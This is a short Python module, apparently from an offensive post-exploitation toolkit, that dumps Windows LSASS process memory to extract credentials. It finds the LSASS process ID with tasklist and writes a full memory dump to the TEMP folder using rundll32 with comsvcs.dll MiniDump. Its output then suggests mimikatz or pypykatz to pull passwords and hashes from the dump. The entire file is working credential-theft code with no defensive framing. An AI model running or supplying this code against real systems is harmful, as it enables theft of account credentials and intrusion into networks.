"""LSASS credential dump via comsvcs.dll MiniDump technique (Windows)."""

import os
import subprocess


def dump_lsass() -> str:
    if os.name != 'nt':
        return '[-] LSASS dump is Windows-only'

    try:
        output = subprocess.check_output(
            'tasklist /fi "imagename eq lsass.exe" /fo csv /nh',
            shell=True, timeout=10
        ).decode(errors='replace')

        pid = None
        for line in output.strip().split('\n'):
            parts = line.replace('"', '').split(',')
            if len(parts) >= 2 and 'lsass' in parts[0].lower():
                pid = parts[1].strip()
                break

        if not pid:
            return '[-] LSASS process not found'

        temp = os.environ.get('TEMP', os.path.expanduser('~'))
        dump_path = os.path.join(temp, 'lsass.dmp')

        cmd = (
            f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump '
            f'{pid} "{dump_path}" full'
        )
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)

        if os.path.exists(dump_path) and os.path.getsize(dump_path) > 10000:
            size_mb = os.path.getsize(dump_path) / (1024 * 1024)
            return f'[+] LSASS dumped: {dump_path} ({size_mb:.1f} MB)\n[*] Use mimikatz/pypykatz to extract credentials'
        return f'[-] Dump failed: {result.stderr.decode(errors="replace")}'
    except subprocess.TimeoutExpired:
        return '[-] LSASS dump timed out'
    except Exception as e:
        return f'[-] LSASS dump error: {str(e)}'


def find_lsass_pid() -> int:
    if os.name != 'nt':
        return -1
    try:
        output = subprocess.check_output(
            'tasklist /fi "imagename eq lsass.exe" /fo csv /nh',
            shell=True, timeout=5
        ).decode(errors='replace')
        for line in output.strip().split('\n'):
            parts = line.replace('"', '').split(',')
            if len(parts) >= 2:
                return int(parts[1].strip())
    except Exception:
        pass
    return -1
